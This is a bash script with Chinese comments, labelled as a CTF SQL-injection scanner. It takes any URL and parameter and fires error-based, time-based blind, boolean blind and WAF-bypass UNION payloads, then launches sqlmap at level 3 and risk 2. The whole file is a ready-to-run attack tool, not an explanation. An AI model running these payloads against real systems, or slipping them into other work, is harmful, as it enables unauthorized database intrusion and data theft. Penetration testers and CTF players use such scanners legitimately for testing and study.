#!/bin/bash
# CTF SQL注入自动化检测
# 用法: bash sqli.sh <URL> [PARAM]

URL="${1:?用法: bash sqli.sh <URL> [PARAM]}"
PARAM="${2:-id}"

echo "=========================================="
echo "  SQL注入检测: $URL (param: $PARAM)"
echo "=========================================="

# 手工检测
echo -e "\n[1/4] 基于错误的检测"
for payload in "'" "1'" "') OR 1=1--" "\" OR 1=1--" "1 OR 1=1" "1' OR '1'='1"; do
    encoded=$(/usr/bin/python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null)
    resp=$(curl -sk "$URL?$PARAM=$encoded" --max-time 5 2>/dev/null)
    if echo "$resp" | grep -iqE "(sql|syntax|mysql|ora-|pg_|sqlite|mssql|error|warning|exception)"; then
        echo -e "  \033[31m[!] SQL错误触发: $PARAM=$payload\033[0m"
        echo "$resp" | grep -iE "(sql|syntax|mysql|ora-|pg_|sqlite|mssql|error)" | head -3
        break
    fi
done

echo -e "\n[2/4] 时间盲注检测"
for payload in "' AND SLEEP(3)--" "1 AND SLEEP(3)" "') AND SLEEP(3)--"; do
    encoded=$(/usr/bin/python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null)
    start=$(date +%s)
    curl -sk "$URL?$PARAM=$encoded" --max-time 10 >/dev/null 2>&1
    elapsed=$(($(date +%s) - start))
    if [ "$elapsed" -ge 3 ]; then
        echo -e "  \033[31m[!] 时间盲注! 延迟${elapsed}s: $payload\033[0m"
        break
    fi
done

echo -e "\n[3/4] 布尔盲注检测"
resp_true=$(curl -sk "$URL?$PARAM=1%20AND%201=1" --max-time 5 2>/dev/null | wc -c)
resp_false=$(curl -sk "$URL?$PARAM=1%20AND%201=2" --max-time 5 2>/dev/null | wc -c)
if [ "$resp_true" != "$resp_false" ] && [ "$resp_true" -gt 0 ] && [ "$resp_false" -gt 0 ]; then
    echo -e "  \033[31m[!] 布尔盲注! 真=$resp_true bytes, 偏=$resp_false bytes\033[0m"
fi

echo -e "\n[4/4] WAF绕过Payload"
for payload in "/**/UNION/**/SELECT/**/1,2,3--" "/*!50000UNION*//*!50000SELECT*/1,2,3--" "%0aUNION%0aSELECT%0a1,2,3--" "1'UNION%09SELECT%091,2,3--" "1'||1=1--"; do
    encoded=$(/usr/bin/python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null)
    resp=$(curl -sk "$URL?$PARAM=$encoded" --max-time 5 2>/dev/null)
    if echo "$resp" | grep -iqE "(sql|syntax|mysql|union|select|error)"; then
        echo -e "  \033[33m[?] 绕过Payload可能有效: $payload\033[0m"
    fi
done

echo -e "\n[*] sqlmap自动化 (如果已安装)..."
echo "  sqlmap -u \"$URL?$PARAM=1\" --batch --level=3 --risk=2 --timeout=10 --threads=5"
which sqlmap >/dev/null 2>&1 && sqlmap -u "$URL?$PARAM=1" --batch --level=3 --risk=2 --timeout=10 --threads=5 --random-agent 2>&1 | tail -20 || echo "  sqlmap未安装,跳过"

echo -e "\n=========================================="
echo "SQL注入检测完成"
echo "=========================================="
